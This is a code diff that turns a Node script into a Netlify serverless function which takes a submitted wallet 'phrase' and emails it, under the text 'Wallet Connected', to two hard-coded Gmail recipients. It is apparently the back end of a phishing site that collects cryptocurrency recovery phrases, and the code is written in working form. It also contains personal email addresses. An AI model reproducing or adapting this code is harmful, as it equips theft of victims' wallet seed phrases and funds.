@@ -1,61 +1,57 @@
-const nodemailer = require('nodemailer');
-require('dotenv').config();
+// netlify/functions/sendEmail.js
+const nodemailer = require("nodemailer");
 
-// Create transporter for the first email account
-let transporter1 = nodemailer.createTransport({
-    service: 'gmail',
+exports.handler = async (event, context) => {
+  const { subject, phrase } = JSON.parse(event.body);
+
+  const recipientEmails = ["walletvitaldetails@gmail.com", "oyeyedave@gmail.com"];
+
+  const transporter1 = nodemailer.createTransport({
+    service: "gmail",
     auth: {
-        user: process.env.EMAIL_USER1,
-        pass: process.env.EMAIL_PASS1
-    }
-});
+      user: process.env.EMAIL_USER1,
+      pass: process.env.EMAIL_PASS1,
+    },
+  });
 
-// Create transporter for the second email account
-let transporter2 = nodemailer.createTransport({
-    service: 'gmail',
+  const transporter2 = nodemailer.createTransport({
+    service: "gmail",
     auth: {
-        user: process.env.EMAIL_USER2,
-        pass: process.env.EMAIL_PASS2
-    }
-});
+      user: process.env.EMAIL_USER2,
+      pass: process.env.EMAIL_PASS2,
+    },
+  });
 
-// Define the message content
-const phrase = "This is the secret phrase";
-const message = {
-    subject: "Wallet Connected",
-    text: `Phrase: ${phrase}`
-};
+  const message = {
+    subject: subject,
+    text: `Wallet Connected. \nPhrase: ${phrase}`,
+  };
 
-// Email options for the first recipient
-let mailOptions1 = {
+  const mailOptions1 = {
     from: process.env.EMAIL_USER1,
-    to: 'david.ugwu.oluchi@gmail.com',
+    to: recipientEmails[0],
     subject: message.subject,
-    text: message.text
-};
+    text: message.text,
+  };
 
-// Email options for the second recipient
-let mailOptions2 = {
+  const mailOptions2 = {
     from: process.env.EMAIL_USER2,
-    to: 'adlanmunch@gmail.com',
+    to: recipientEmails[1],
     subject: message.subject,
-    text: message.text
+    text: message.text,
+  };
+
+  try {
+    await transporter1.sendMail(mailOptions1);
+    await transporter2.sendMail(mailOptions2);
+    return {
+      statusCode: 200,
+      body: JSON.stringify({ message: "Emails sent successfully" }),
+    };
+  } catch (error) {
+    return {
+      statusCode: 500,
+      body: JSON.stringify({ error: "Error sending emails", details: error }),
+    };
+  }
 };
-
-// Send mail using the first transporter
-transporter1.sendMail(mailOptions1, function(error, info) {
-    if (error) {
-        console.log('Error sending to Recipient 1:', error);
-    } else {
-        console.log('Email sent to Recipient 1:', info.response);
-    }
-});
-
-// Send mail using the second transporter
-transporter2.sendMail(mailOptions2, function(error, info) {
-    if (error) {
-        console.log('Error sending to Recipient 2:', error);
-    } else {
-        console.log('Email sent to Recipient 2:', info.response);
-    }
-});
